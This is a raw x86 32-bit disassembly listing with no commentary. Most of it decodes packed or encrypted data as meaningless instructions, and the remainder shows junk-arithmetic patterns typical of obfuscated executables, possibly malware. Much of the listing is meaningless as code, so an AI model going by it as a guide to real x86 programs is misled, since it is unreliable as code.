  40a58d:	lods   eax,DWORD PTR ds:[esi]
  40a58e:	or     eax,0x4db0a7ae
  40a593:	cmp    al,0x1d
  40a595:	mov    ebx,0xebe707e
  40a59a:	gs mov bl,0xc9
  40a59d:	dec    ebp
  40a59e:	ins    BYTE PTR es:[edi],dx
  40a59f:	repnz cmp al,BYTE PTR [ecx+0x4ab1f39e]
  40a5a6:	jmp    0x68a9401b
  40a5ab:	fwait
  40a5ac:	push   ecx
  40a5ad:	repz jnp 0x40a5ed
  40a5b0:	sub    BYTE PTR [ebx+ecx*2],cl
  40a5b3:	add    dl,BYTE PTR [edi]
  40a5b5:	std    
  40a5b6:	push   eax
  40a5b7:	hlt    
  40a5b8:	add    eax,0x4e8f2ddc
  40a5bd:	icebp  
  40a5be:	pop    edx
  40a5bf:	out    0x60,al
  40a5c1:	outs   dx,DWORD PTR ds:[esi]
  40a5c2:	mov    esi,0x84b3d0ab
  40a5c7:	icebp  
  40a5c8:	inc    ecx
  40a5c9:	jecxz  0x40a5c1
  40a5cb:	(bad)  
  40a5cc:	(bad)  
  40a5cd:	fsub   DWORD PTR [edx+0x32]
  40a5d0:	pop    ds
  40a5d1:	std    
  40a5d2:	push   0xca53cb49
  40a5d7:	cmc    
  40a5d8:	inc    ebp
  40a5d9:	(bad)
  40a5de:	call   0xb76176d5
  40a5e3:	int    0x5e
  40a5e5:	mov    ds:0x124ab7ed,al
  40a5ea:	jno    0x40a5a0
  40a5ec:	stc    
  40a5ed:	mov    WORD PTR [edx+0x634aea5b],gs
  40a5f3:	outs   dx,BYTE PTR ds:[esi]
  40a5f4:	add    ah,BYTE PTR [eax]
  40a5f6:	ficom  WORD PTR [esi+0x31]
  40a5f9:	mov    esi,0x46dbd434
  40a5fe:	add    eax,0xedee1ec5
  40a603:	lods   al,BYTE PTR ds:[esi]
  40a604:	sbb    eax,0xfb037df1
  40a609:	(bad)  
  40a60a:	pop    ebp
  40a60b:	mov    dl,0x5f
  40a60d:	sbb    esi,esi
  40a60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a610:	scas   al,BYTE PTR es:[edi]
  40a611:	or     al,ch
  40a613:	and    ah,BYTE PTR [edx+ebx*2]
  40a616:	in     eax,0xf2
  40a618:	out    dx,al
  40a619:	xchg   ecx,eax
  40a61a:	adc    eax,0xe8cf2909
  40a61f:	in     al,0xf8
  40a621:	or     al,0x6d
  40a623:	mov    ebx,0x5acd123d
  40a628:	aam    0x8c
  40a62a:	push   eax
  40a62b:	bnd ja 0x40a5d7
  40a62e:	xchg   cl,bh
  40a630:	and    BYTE PTR [eax],al
  40a632:	mov    al,ds:0xe7694066
  40a637:	pop    ss
  40a638:	sub    eax,0x9852d6d4
  40a63d:	retf   
  40a63e:	jmp    0xadfb:0xb9cd74e8
  40a645:	push   0xffffff82
  40a647:	xlat   BYTE PTR ds:[ebx]
  40a648:	adc    eax,0x8f866f3d
  40a64d:	mov    bh,0x1
  40a64f:	jmp    0x40a6bb
  40a651:	cmp    edx,DWORD PTR [eax-0x5b]
  40a654:	cmp    DWORD PTR [esi],0xde6fa461
  40a65a:	sahf   
  40a65b:	pop    ebp
  40a65c:	pop    edi
  40a65d:	pop    ebp
  40a65e:	push   esp
  40a65f:	ja     0x40a5fc
  40a661:	into   
  40a662:	icebp  
  40a663:	sar    DWORD PTR [ebp+0xab6549b],0x3e
  40a66a:	add    al,0x4e
  40a66c:	xchg   esp,eax
  40a66d:	sbb    bh,BYTE PTR [ecx]
  40a66f:	dec    edx
  40a670:	das    
  40a671:	popf   
  40a672:	push   0xffffffff
  40a674:	and    bh,BYTE PTR [esi+0x1e]
  40a677:	cmp    BYTE PTR [eax+0x3cff2523],bl
  40a67d:	pusha  
  40a67e:	dec    esp
  40a67f:	jg     0x40a6e4
  40a681:	ja     0x40a66b
  40a683:	jae    0x40a649
  40a685:	or     al,0xe9
  40a687:	popf   
  40a688:	retf   0xa727
  40a68b:	sub    esi,DWORD PTR [edx+0x4c02d41b]
  40a691:	add    dl,BYTE PTR [esi+0x20411e4a]
  40a697:	pop    esi
  40a698:	inc    ebx
  40a699:	iret   
  40a69a:	add    DWORD PTR [edi+0x75],esi
  40a69d:	add    al,0xb6
  40a69f:	aad    0xde
  40a6a1:	lods   al,BYTE PTR ds:[esi]
  40a6a2:	outs   dx,BYTE PTR ds:[esi]
  40a6a3:	lods   al,BYTE PTR ds:[esi]
  40a6a4:	push   0xffffffb2
  40a6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6a7:	mov    eax,ebx
  40a6a9:	pop    ebp
  40a6aa:	pop    edx
  40a6ab:	push   edi
  40a6ac:	dec    esi
  40a6ad:	jbe    0x40a6a8
  40a6af:	xchg   edi,eax
  40a6b0:	fs dec esp
  40a6b2:	or     BYTE PTR ds:0x59bef7be,0x12
  40a6b9:	cli    
  40a6ba:	arpl   bx,si
  40a6bc:	mov    dl,0x18
  40a6be:	adc    eax,0x15bf0080
  40a6c3:	add    bl,dh
  40a6c5:	scas   eax,DWORD PTR es:[edi]
  40a6c6:	jns    0x40a73e
  40a6c8:	(bad)  
  40a6c9:	cmp    al,0xec
  40a6cb:	add    eax,0xea3e673c
  40a6d0:	inc    esp
  40a6d1:	lods   eax,DWORD PTR ds:[esi]
  40a6d2:	push   esi
  40a6d3:	sub    BYTE PTR [ecx],bh
  40a6d5:	xor    BYTE PTR [edi-0x8],bh
  40a6d8:	cld    
  40a6d9:	aam    0x32
  40a6db:	jle    0x40a6f1
  40a6dd:	loop   0x40a6c9
  40a6df:	push   ss
  40a6e0:	retf   0x8e78
  40a6e3:	mov    esp,0xa01dea84
  40a6e8:	frstor [ebx-0x22]
  40a6eb:	cdq    
  40a6ec:	idiv   DWORD PTR [ebx]
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xac72ec0c
  40a7ac:	cmp    al,bh
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	pop    ebp
  40a7b7:	jg     0x40a7e9
  40a7b9:	ds push edi
  40a7bb:	popa   
  40a7bc:	cmp    edx,esp
  40a7be:	inc    ebx
  40a7bf:	cld    
  40a7c0:	pusha  
  40a7c1:	mov    eax,DWORD PTR [ebx+0x6a23d0a9]
  40a7c7:	popf   
  40a7c8:	push   ebx
  40a7c9:	popf   
  40a7ca:	fadd   st,st(4)
  40a7cc:	dec    ebx
  40a7cd:	or     eax,0xffe87df
  40a7d2:	dec    BYTE PTR [eax-0x7897e4b7]
  40a7d8:	cmp    al,0xde
  40a7da:	fld    DWORD PTR [ebx+0x2d]
  40a7dd:	sub    eax,edi
  40a7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7e0:	into   
  40a7e1:	and    edi,DWORD PTR [ebp-0x621ff6e3]
  40a7e7:	(bad)  
  40a7e8:	adc    al,0x75
  40a7ea:	cmp    ecx,ebx
  40a7ec:	mov    edi,0xcc873809
  40a7f1:	jp     0x40a835
  40a7f3:	add    al,0xda
  40a7f5:	lods   eax,DWORD PTR cs:[esi]
  40a7f7:	call   0xaa65f685
  40a7fc:	gs cmp esi,edx
  40a7ff:	xor    ebp,esi
  40a801:	jmp    0xd7677a59
  40a806:	idiv   BYTE PTR ds:0xefb3153c
  40a80c:	pop    es
  40a80d:	jb     0x40a7c4
  40a80f:	aam    0xcd
  40a811:	add    DWORD PTR [ecx-0x1ecf0fe8],ecx
  40a817:	in     eax,dx
  40a818:	cmc    
  40a819:	pop    ebx
  40a81a:	pop    ds
  40a81b:	dec    esp
  40a81c:	dec    edi
  40a81d:	test   al,0x5
  40a81f:	cmp    DWORD PTR [ecx+0x6c],ebx
  40a822:	iret   
  40a823:	clc    
  40a824:	lea    ebp,[edx]
  40a826:	rol    DWORD PTR [ebp+0x44829376],0xd7
  40a82d:	xchg   ebx,eax
  40a82e:	push   ds
  40a82f:	jl     0x40a884
  40a831:	add    esp,edx
  40a833:	ret    
  40a834:	(bad)  
  40a835:	push   ds
  40a836:	jecxz  0x40a867
  40a838:	cmc    
  40a839:	xchg   ecx,eax
  40a83a:	fimul  WORD PTR [ebp-0x6]
  40a83d:	adc    al,0x51
  40a83f:	mov    ecx,0x1e36d17c
  40a844:	mov    ds:0x40f405e1,al
  40a849:	jbe    0x40a817
  40a84b:	adc    DWORD PTR [esi+0x15],0xc4b55711
  40a852:	cld    
  40a853:	jnp    0x40a821
  40a855:	arpl   WORD PTR [ebp+0x4d368a50],ax
  40a85b:	xor    ecx,edi
  40a85d:	add    ch,ch
  40a85f:	stc    
  40a860:	push   esi
  40a861:	pop    esi
  40a862:	ret    0x19b0
  40a865:	sub    ah,dl
  40a867:	call   0x39e8:0xa150750f
  40a86e:	jne    0x40a8ac
  40a870:	sub    al,BYTE PTR [ebx]
  40a872:	add    al,BYTE PTR [edx]
  40a874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a875:	dec    ebp
  40a876:	out    0x3c,eax
  40a878:	mov    ah,0x8f
  40a87a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a87b:	test   BYTE PTR [esp+eiz*8-0x21],al
  40a87f:	mov    dh,0xe8
  40a881:	pop    edx
  40a882:	and    eax,0xb1ac9dd4
  40a887:	add    eax,0x5b5602b3
  40a88c:	pushf  
  40a88d:	loope  0x40a8ff
  40a88f:	out    0x88,al
  40a891:	mov    ebp,0x58137e6d
  40a896:	jl     0x40a839
  40a898:	sbb    DWORD PTR [ebp+0x6e],ecx
  40a89b:	sbb    eax,0x3783ccba
  40a8a0:	jne    0x40a867
  40a8a2:	lods   eax,DWORD PTR ds:[esi]
  40a8a3:	mov    ebp,0xf20ef350
  40a8a8:	lds    edx,FWORD PTR [edx-0x11]
  40a8ab:	loop   0x40a8fe
  40a8ad:	inc    ebx
  40a8ae:	fcomp  QWORD PTR [esi]
  40a8b0:	cmp    al,0xc8
  40a8b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8b3:	push   ebx
  40a8b4:	stos   DWORD PTR es:[edi],eax
  40a8b5:	push   0xaeae4af2
  40a8ba:	push   0x63cede64
  40a8bf:	rdmsr  
  40a8c1:	fisub  DWORD PTR [ebx+ebx*8]
  40a8c4:	cli    
  40a8c5:	fidivr WORD PTR [edi+0x45]
  40a8c8:	retf   
  40a8c9:	xor    eax,0x349fce48
  40a8ce:	lea    esp,[ebx]
  40a8d0:	or     DWORD PTR [ecx+eax*8+0x32473a70],eax
  40a8d7:	pop    ds
  40a8d8:	inc    edi
  40a8d9:	xor    al,BYTE PTR [esi-0x23]
  40a8dc:	sbb    dh,BYTE PTR [ebp+0x4e9bcae3]
  40a8e2:	cwde   
  40a8e3:	add    DWORD PTR [esi+0xdcaed3],ebp
  40a8e9:	lahf   
  40a8ea:	xor    DWORD PTR [ecx+0x43],0x75
  40a8ee:	addr16 add al,dh
  40a8f1:	ins    BYTE PTR es:[edi],dx
  40a8f2:	arpl   bp,dx
  40a8f4:	test   DWORD PTR [edi-0x33f61cba],eax
  40a8fa:	pop    esi
  40a8fb:	mov    eax,ds:0x666a64a
  40a900:	scas   eax,DWORD PTR es:[edi]
  40a901:	scas   al,BYTE PTR es:[edi]
  40a902:	or     BYTE PTR [eax-0x50],ah
  40a905:	and    ebx,DWORD PTR [edi-0x25]
  40a908:	shr    ah,0x6a
  40a90b:	mov    esi,es
  40a90d:	es and dl,al
  40a910:	xchg   DWORD PTR [ebp-0x67],edi
  40a913:	push   ecx
  40a914:	pop    ss
  40a915:	inc    esp
  40a916:	xchg   edi,eax
  40a917:	lahf   
  40a918:	xlat   BYTE PTR ds:[ebx]
  40a919:	dec    edi
  40a91a:	xchg   BYTE PTR [eax-0x27],bl
  40a91d:	fisttp WORD PTR [ecx+ebp*4-0x566b4fa9]
  40a924:	inc    esi
  40a925:	add    BYTE PTR [ebx-0x6d],bh
  40a928:	dec    esi
  40a929:	xor    dl,ah
  40a92b:	rol    BYTE PTR [esi-0x529cc221],cl
  40a931:	push   ebx
  40a932:	(bad)  
  40a933:	cdq    
  40a934:	adc    eax,0x83303593
  40a939:	out    0x96,eax
  40a93b:	and    eax,0xf300f7f4
  40a940:	stos   BYTE PTR es:[edi],al
  40a941:	and    eax,DWORD PTR [esi+0x24]
  40a944:	iret   
  40a945:	(bad)  
  40a946:	cdq    
  40a947:	sbb    dh,BYTE PTR [edx+edi*1-0x28]
  40a94b:	xor    esi,DWORD PTR [edx]
  40a94d:	bound  edi,QWORD PTR [ebx]
  40a94f:	dec    eax
  40a950:	xchg   esp,eax
  40a951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a952:	cmp    ch,BYTE PTR [eax+ebx*8+0xb86c2b]
  40a959:	in     eax,dx
  40a95a:	inc    ecx
  40a95b:	retf   
  40a95c:	std    
  40a95d:	fst    QWORD PTR ds:0x1c08b70f
  40a963:	push   cs
  40a964:	mov    eax,ds:0x35bba463
  40a969:	xchg   ebp,eax
  40a96a:	pop    ss
  40a96b:	add    ch,BYTE PTR [edi-0x7c]
  40a96e:	adc    DWORD PTR [edx+edx*8+0x78],esi
  40a972:	xchg   ecx,eax
  40a973:	mov    ebp,0xef3b2cb3
  40a978:	jo     0x40a905
  40a97a:	sbb    edx,eax
  40a97c:	aam    0x13
  40a97e:	xchg   ecx,eax
  40a97f:	sub    edx,DWORD PTR [edx-0x5d]
  40a982:	mov    ecx,0xf7863c32
  40a987:	fnstenv [ebx]
  40a989:	xchg   ebp,eax
  40a98a:	jge    0x40a95a
  40a98c:	(bad)  
  40a98e:	jl     0x40a9b0
  40a990:	jl     0x40a960
  40a992:	add    eax,0x418904ff
  40a997:	pop    ecx
  40a998:	fwait
  40a999:	push   ds
  40a99a:	lock sbb ah,ch
  40a99d:	push   ss
  40a99e:	jns    0x40a9ba
  40a9a0:	mov    ecx,DWORD PTR [edx-0x23]
  40a9a3:	jg     0x40a983
  40a9a5:	mov    eax,ebp
  40a9a7:	jle    0x40a9e4
  40a9a9:	loopne 0x40aa19
  40a9ab:	les    edi,FWORD PTR [ecx]
  40a9ad:	fucomi st,st(1)
  40a9af:	xor    BYTE PTR [edx],cl
  40a9b1:	gs popa 
  40a9b3:	je     0x40a93a
  40a9b5:	pop    ecx
  40a9b6:	pop    es
  40a9b7:	sub    ebx,DWORD PTR [edi-0x50]
  40a9ba:	cmp    ah,dh
  40a9bc:	pusha  
  40a9bd:	pusha  
  40a9be:	xchg   esi,eax
  40a9bf:	in     al,dx
  40a9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c1:	les    edi,FWORD PTR [eax+ecx*8+0x58e26776]
  40a9c8:	add    bh,BYTE PTR [eax]
  40a9ca:	mov    bl,0x63
  40a9cc:	test   BYTE PTR [esi+ebx*8-0x74],dl
  40a9d0:	sbb    al,0x78
  40a9d2:	arpl   WORD PTR [eax],si
  40a9d4:	sbb    BYTE PTR [edi+ebp*8-0x1c57dec7],dl
  40a9db:	mov    ebx,0x92ef65fd
  40a9e0:	les    ebx,FWORD PTR [eax+0x6f]
  40a9e3:	lds    edx,FWORD PTR [ecx+0x4f3bb11f]
  40a9e9:	add    al,0xde
  40a9eb:	jnp    0x40aa3b
  40a9ed:	adc    al,0x36
  40a9ef:	cmp    BYTE PTR [ecx+edx*4-0x4d],bl
  40a9f3:	pop    edx
  40a9f4:	inc    esi
  40a9f5:	xchg   esp,eax
  40a9f6:	test   BYTE PTR ds:0x312d7a2e,bh
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	and    eax,0xd0475431
  40aa39:	jmp    0x40aab9
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40aab2
  40aa41:	dec    edx
  40aa42:	scas   eax,DWORD PTR es:[edi]
  40aa43:	pop    es
  40aa44:	cmp    al,0x95
  40aa46:	outs   dx,BYTE PTR ds:[esi]
  40aa47:	in     eax,0x2c
  40aa49:	or     al,0x75
  40aa4b:	xchg   ebp,eax
  40aa4c:	inc    esp
  40aa4d:	mov    ds:0x8627b88e,eax
  40aa52:	jg     0x40aa6d
  40aa54:	and    eax,0xa5fb853a
  40aa59:	fist   WORD PTR [esp+ecx*4-0x5d]
  40aa5d:	fstp   TBYTE PTR [ebp+eiz*8+0x60]
  40aa61:	inc    ecx
  40aa62:	retf   
  40aa63:	(bad)  
  40aa64:	out    dx,eax
  40aa65:	add    eax,DWORD PTR [esi-0x7]
  40aa68:	inc    ebp
  40aa69:	stos   DWORD PTR es:[edi],eax
  40aa6a:	xor    BYTE PTR [esi],bl
  40aa6c:	sub    eax,0x6e2dfd1a
  40aa71:	out    0x43,eax
  40aa73:	pop    ds
  40aa74:	ins    DWORD PTR es:[edi],dx
  40aa75:	setle  BYTE PTR ds:0xdf65452c
  40aa7c:	retf   
  40aa7d:	mov    DWORD PTR [ebp+0x72befbe4],esp
  40aa83:	and    ah,ah
  40aa85:	push   esp
  40aa86:	mov    WORD PTR [ecx],cs
  40aa88:	jae    0x40aa7d
  40aa8a:	mov    ch,0xa
  40aa8c:	imul   ecx,DWORD PTR [eax+0x76],0xffffff94
  40aa90:	std    
  40aa91:	pushf  
  40aa92:	int    0xbb
  40aa94:	xchg   edi,eax
  40aa95:	mov    ds:0xd64bc049,al
  40aa9a:	push   edx
  40aa9b:	mov    edi,0x5c89673b
  40aaa0:	adc    cl,BYTE PTR [eax+0x8]
  40aaa3:	and    edi,esp
  40aaa5:	cmp    eax,0x7ba3712a
  40aaaa:	leave  
  40aaab:	sub    dh,bl
  40aaad:	sahf   
  40aaae:	pop    ecx
  40aaaf:	jno    0x40aad0
  40aab1:	fdiv   DWORD PTR [ebp-0x4708e542]
  40aab7:	rcl    dl,0xec
  40aaba:	xlat   BYTE PTR ds:[ebx]
  40aabb:	lods   eax,DWORD PTR ds:[esi]
  40aabc:	mov    esi,0x451aa847
  40aac1:	repz gs (bad) 
  40aac5:	imul   ebx,DWORD PTR [esi-0x18],0x0
  40aac9:	pop    ecx
  40aaca:	in     al,dx
  40aacb:	cdq    
  40aacc:	fs xchg esp,eax
  40aace:	retf   
  40aacf:	dec    esi
  40aad0:	ja     0x40aa77
  40aad2:	jle    0x40aa66
  40aad4:	add    BYTE PTR [ebp-0x22a2178],bh
  40aada:	jne    0x40ab23
  40aadc:	sub    ecx,DWORD PTR [eax-0x2a41c118]
  40aae2:	mov    ds:0x7262b747,eax
  40aae7:	in     al,dx
  40aae8:	scas   al,BYTE PTR es:[edi]
  40aae9:	jg     0x40aaf5
  40aaeb:	mov    BYTE PTR [esi],dh
  40aaed:	sbb    ebx,ecx
  40aaef:	popa   
  40aaf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaf1:	mov    BYTE PTR [ebx+esi*1-0x58],0xd7
  40aaf6:	mov    al,0x76
  40aaf8:	in     al,dx
  40aaf9:	adc    eax,0xe88e2e5f
  40aafe:	inc    ebx
  40aaff:	inc    esp
  40ab00:	fld    QWORD PTR [edi-0x6c]
  40ab03:	cli    
  40ab04:	cmp    dh,cl
  40ab06:	cmp    ah,0xf9
  40ab09:	dec    edx
  40ab0a:	fiadd  WORD PTR [esi]
  40ab0c:	add    al,0x9b
  40ab0e:	mov    DWORD PTR [ebx+0x5],esp
  40ab11:	call   0xeba3:0x237d37a8
  40ab18:	ins    DWORD PTR es:[edi],dx
  40ab19:	adc    bh,al
  40ab1b:	pop    ebp
  40ab1c:	je     0x40ab71
  40ab1e:	scas   eax,DWORD PTR es:[edi]
  40ab1f:	sub    ebp,DWORD PTR [esi+esi*2+0x8d5da82]
  40ab26:	sbb    BYTE PTR [ecx-0x5e],ch
  40ab29:	aaa    
  40ab2a:	pop    ebx
  40ab2b:	mov    eax,0x5cb1e14a
  40ab30:	leave  
  40ab31:	sbb    eax,0x3c5ba1bd
  40ab36:	in     al,dx
  40ab37:	dec    edi
  40ab38:	je     0x40ab0f
  40ab3a:	test   al,0x10
  40ab3c:	js     0x40abaa
  40ab3e:	mov    dl,0xe9
  40ab40:	fsubr  DWORD PTR [ebx-0x4c410e24]
  40ab46:	pop    ds
  40ab47:	lods   al,BYTE PTR ds:[esi]
  40ab48:	in     al,dx
  40ab49:	xlat   BYTE PTR fs:[ebx]
  40ab4b:	jnp    0x332c6d0
  40ab51:	jle    0x40ab5c
  40ab53:	sub    BYTE PTR [ebp+0x3dddc8fe],bl
  40ab59:	mov    eax,0x6ee5b82f
  40ab5e:	sbb    ebx,DWORD PTR [ebx+0x4c]
  40ab61:	std    
  40ab62:	dec    ebx
  40ab63:	mov    edx,0x50b2408c
  40ab68:	imul   eax,DWORD PTR [edx+0xe],0xffffffaa
  40ab6c:	add    BYTE PTR [edx*4-0x6463ae32],ah
  40ab73:	mov    ch,0xba
  40ab75:	shl    BYTE PTR [ebx-0x24c1f761],cl
  40ab7b:	icebp  
  40ab7c:	mov    ah,0xfb
  40ab7e:	xor    bl,al
  40ab80:	xchg   ebx,ebp
  40ab82:	aaa    
  40ab83:	(bad)  
  40ab84:	lods   al,BYTE PTR ds:[esi]
  40ab85:	push   ebp
  40ab86:	add    DWORD PTR [edx+0x53129ac2],edx
  40ab8c:	repz and al,0x83
  40ab8f:	xor    al,BYTE PTR [ebp-0x66ecdfcb]
  40ab95:	ficom  WORD PTR [edi+0x34c07e66]
  40ab9b:	aaa    
  40ab9c:	in     al,0xb2
  40ab9e:	or     al,0x4e
  40aba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aba1:	jo     0x40ab32
  40aba3:	hlt    
  40aba4:	stos   DWORD PTR es:[edi],eax
  40aba5:	push   ebx
  40aba6:	inc    ecx
  40aba7:	sub    bl,cl
  40aba9:	jp     0x40ab68
  40abab:	mov    ch,0x4e
  40abad:	mov    dh,BYTE PTR [eax]
  40abaf:	mov    al,0x84
  40abb1:	in     eax,dx
  40abb2:	dec    edi
  40abb3:	jmp    0xe2d5:0xa5305ffa
  40abba:	ins    BYTE PTR es:[edi],dx
  40abbb:	fst    DWORD PTR [esp+edx*8-0x555c7b73]
  40abc2:	shr    DWORD PTR [ebx-0x254a0c96],0xce
  40abc9:	inc    ebp
  40abca:	mov    BYTE PTR [edx+0x3e715e12],dl
  40abd0:	cmp    BYTE PTR [esp+ebp*2],0xd2
  40abd4:	shr    DWORD PTR [ecx+0x5c36abb],1
  40abda:	add    al,0x6e
  40abdc:	push   cs
  40abdd:	sub    edi,edi
  40abdf:	sub    al,0x9c
  40abe1:	fucomp st(6)
  40abe3:	xchg   ebx,eax
  40abe4:	xchg   ebp,eax
  40abe5:	fmul   DWORD PTR [esi-0x6d]
  40abe8:	jle    0x40ab96
  40abea:	inc    esi
  40abeb:	inc    edx
  40abec:	xchg   ebp,eax
  40abed:	fsubr  QWORD PTR [ecx+0x35]
  40abf0:	push   0x4e
  40abf2:	and    bh,BYTE PTR [ecx]
  40abf4:	jmp    0x40ac41
  40abf6:	mov    ah,0xc3
  40abf8:	pop    ds
  40abf9:	ret    0x49eb
  40abfc:	cmp    dh,cl
  40abfe:	and    esi,edi
  40ac00:	int3   
  40ac01:	xchg   ebx,eax
  40ac02:	mov    ebx,0xbfc15ee9
  40ac07:	push   edi
  40ac08:	or     BYTE PTR [ecx-0x80],bl
  40ac0b:	xchg   edi,eax
  40ac0c:	xchg   ecx,eax
  40ac0d:	aam    0x5b
  40ac0f:	(bad)  [esi-0x3d]
  40ac12:	cmp    bh,ch
  40ac14:	in     al,0xc3
  40ac16:	push   esp
  40ac17:	enter  0xac08,0x12
  40ac1b:	xchg   ebp,eax
  40ac1c:	das    
  40ac1d:	add    esi,ebx
  40ac1f:	mov    bl,0x7a
  40ac21:	xor    bh,dl
  40ac23:	or     DWORD PTR [ecx+0x30b7fc6f],esi
  40ac29:	mul    edx
  40ac2b:	cmp    cl,BYTE PTR [edi+0x2f851620]
  40ac31:	push   ecx
  40ac32:	retf   0xe690
  40ac35:	jb     0x40ac2f
  40ac37:	inc    edi
  40ac38:	jmp    0x40abd8
  40ac3a:	in     eax,dx
  40ac3b:	sub    DWORD PTR [eax+0x1186cf00],edi
  40ac41:	pop    edi
  40ac42:	rcr    BYTE PTR [ecx+0x38e2f007],0x40
  40ac49:	xchg   al,al
  40ac4b:	repnz cmp BYTE PTR [eax-0x619feca3],dh
  40ac52:	(bad)  
  40ac53:	mov    ah,BYTE PTR [ebx-0x3952ca48]
  40ac59:	into   
  40ac5a:	adc    eax,0x837e59a7
  40ac5f:	push   ebx
  40ac60:	xor    DWORD PTR [bx-0x7e],edi
  40ac64:	adc    al,0x9e
  40ac66:	(bad)  
  40ac67:	mov    al,0xdd
  40ac69:	gs pop ebp
  40ac6b:	push   0xffffff8f
  40ac6d:	xchg   esi,eax
  40ac6e:	xor    eax,0xfffffff4
  40ac71:	sahf   
  40ac72:	call   0xec3e:0x496a3b5e
  40ac79:	test   al,0x8e
  40ac7b:	sub    bh,BYTE PTR [ebp-0xe7ddc7f]
  40ac81:	into   
  40ac82:	ins    DWORD PTR es:[di],dx
  40ac84:	pop    ecx
  40ac85:	mov    ds:0x840fc83b,eax
  40ac8a:	pop    edi
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [esi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	ss inc ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0xa9b4220],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acde
  40ad2c:	lea    ebp,[eax-0x35]
  40ad2f:	push   edx
  40ad30:	and    DWORD PTR [ebx+0x7f],esi
  40ad33:	add    ch,dl
  40ad35:	es dec ecx
  40ad37:	enter  0xef5e,0xb3
  40ad3b:	mov    ah,0x3
  40ad3d:	imul   ebp,DWORD PTR [esi+eiz*1],0x9617fa3f
  40ad44:	inc    ebp
  40ad45:	ja     0x40acce
  40ad47:	or     dl,BYTE PTR [ebx-0x48cef01e]
  40ad4d:	enter  0x9e73,0x7e
  40ad51:	and    eax,0x7f556809
  40ad56:	lds    ebp,FWORD PTR [edi]
